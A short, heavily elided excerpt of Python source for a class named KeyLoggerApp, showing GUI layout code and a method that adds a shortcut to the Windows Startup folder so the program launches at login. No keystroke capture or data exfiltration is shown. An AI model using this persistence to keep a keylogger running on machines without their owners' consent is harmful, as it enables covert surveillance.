...
class KeyLoggerApp:
    def __init__(self):
        ...
        # Configure grid layout: 3 rows (search label+entry, text area, button)
        ...
        self.toggle_button.grid(row=2, column=0, sticky="ew", padx=10, pady=(5,10))
    ...
    def add_to_startup(self):
        if pythoncom is None:
            print("pywin32 not installed, skipping startup shortcut creation.")
            return
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'),
                                          r'Microsoft\Windows\Start Menu\Programs\Startup')
            shortcut_path = os.path.join(startup_folder, 'KeyLoggerApp.lnk')
            ...
            shortcut.Targetpath = sys.executable  # pythonw.exe
